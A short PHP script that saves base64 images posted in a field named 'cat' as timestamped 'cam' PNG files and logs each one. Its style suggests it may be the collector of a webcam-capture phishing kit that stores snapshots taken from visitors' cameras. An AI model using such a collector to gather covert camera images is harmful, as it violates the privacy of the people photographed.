<?php
$date = date('dMYHis');
$imageData = $_POST['cat'];

if (!empty($imageData)) {
    // Log the receipt of image data
    error_log("[#] Cam file received at: " . date('Y-m-d H:i:s') . "\n", 3, "Log.log");

    // Get the path from the configuration file
    $mypath = trim(file_get_contents("path.txt"));

    // Extract base64 image data and decode it
    $filteredData = substr($imageData, strpos($imageData, ",") + 1);
    $unencodedData = base64_decode($filteredData);

    // Construct the filename
    $myFile = $mypath . 'cam' . $date . '.png';

    // Write the decoded image data to the file
    $fp = fopen($myFile, 'wb');
    if ($fp) {
        fwrite($fp, $unencodedData);
        fclose($fp);
    }
}

exit();
?>
